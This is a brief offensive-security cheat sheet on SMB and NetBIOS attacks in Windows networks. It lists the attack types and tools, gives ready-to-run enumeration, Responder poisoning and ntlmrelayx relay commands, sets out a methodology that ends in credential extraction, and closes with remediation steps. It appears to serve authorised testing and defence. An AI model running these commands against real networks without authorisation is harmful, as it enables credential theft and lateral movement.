# SMB/NetBIOS Attacks

Exploiting SMB/CIFS and NetBIOS protocols in Windows networks.

## Attack Types
- **SMB Relay**: Authentication relay
- **Pass-the-Hash**: NTLM hash usage
- **EternalBlue**: SMBv1 exploitation (CVE-2017-0144)
- **NetBIOS Name Poisoning**: NBNS/LLMNR spoofing

## Tools
- Responder, Impacket (ntlmrelayx), CrackMapExec, Metasploit, enum4linux, smbclient

## Quick Commands
```bash
# Enumerate SMB
enum4linux -a target.com
smbclient -L //target.com -N

# SMB shares
smbmap -H target.com
crackmapexec smb target.com -u '' -p '' --shares

# Responder (LLMNR/NBNS poisoning)
responder -I eth0 -wrf

# SMB relay
ntlmrelayx.py -tf targets.txt -smb2support

# EternalBlue check
nmap --script smb-vuln-ms17-010 target.com
```

## Methodology
1. Enumerate SMB shares
2. Test null sessions
3. Attempt SMB relay
4. Test for SMBv1 (EternalBlue)
5. NBNS/LLMNR poisoning
6. Extract credentials

## Remediation
- Disable SMBv1
- Enable SMB signing
- Disable LLMNR and NetBIOS
- Network segmentation
- Strong authentication

**MITRE**: T1021.002 | **CWE**: CWE-294 | **CVE**: CVE-2017-0144 | **CAPEC**: CAPEC-555
